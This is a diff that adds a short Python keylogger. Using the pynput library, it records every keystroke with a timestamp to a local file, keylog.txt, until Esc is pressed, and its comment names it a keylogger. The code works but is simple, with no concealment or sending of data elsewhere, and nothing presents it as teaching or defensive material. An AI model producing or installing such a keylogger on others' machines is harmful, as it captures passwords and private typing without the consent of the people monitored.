@@ -1,0 +1,27 @@
+import logging
+from pynput import keyboard
+
+# Set up logging
+logging.basicConfig(filename='keylog.txt', level=logging.INFO, format='%(asctime)s: %(message)s')
+
+def on_press(key):
+    try:
+        logging.info(f'Key pressed: {key.char}')
+    except AttributeError:
+        if key == keyboard.Key.space:
+            logging.info('Key pressed: Space')
+        elif key == keyboard.Key.enter:
+            logging.info('Key pressed: Enter')
+        elif key == keyboard.Key.backspace:
+            logging.info('Key pressed: Backspace')
+        else:
+            logging.info(f'Key pressed: {key}')
+
+def on_release(key):
+    if key == keyboard.Key.esc:
+        # Stop the keylogger when the Esc key is pressed
+        return False
+
+# Collect events until the Esc key is pressed
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
